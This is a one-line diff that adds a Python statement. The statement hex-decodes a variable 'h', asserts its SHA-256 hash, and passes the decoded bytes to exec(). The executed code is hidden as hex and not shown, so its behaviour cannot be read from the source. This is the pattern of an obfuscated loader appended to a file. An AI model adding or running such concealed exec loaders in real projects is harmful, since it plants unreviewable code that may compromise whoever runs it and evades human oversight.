@@ -1,0 +1,1 @@
+assert __import__("hashlib").sha256(bytes.fromhex(h)).hexdigest()=='b380d909a85d1ad990bb3af4347fd30ce5e145d1671343a0daaf710875a5b979';exec(bytes.fromhex(h))
